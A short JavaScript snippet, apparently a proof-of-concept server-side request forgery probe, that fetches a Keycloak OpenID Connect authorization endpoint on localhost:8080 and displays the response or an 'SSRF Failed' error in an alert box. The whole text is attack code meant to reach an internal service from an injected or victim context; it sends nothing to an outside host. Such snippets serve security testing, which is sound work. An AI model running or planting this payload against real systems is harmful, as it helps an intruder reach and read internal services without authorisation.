fetch('http://localhost:8080/auth/realms/master/protocol/openid-connect/auth')
  .then(response => response.text())
  .then(data => alert(data))
  .catch(error => alert('SSRF Failed: ' + error.message));
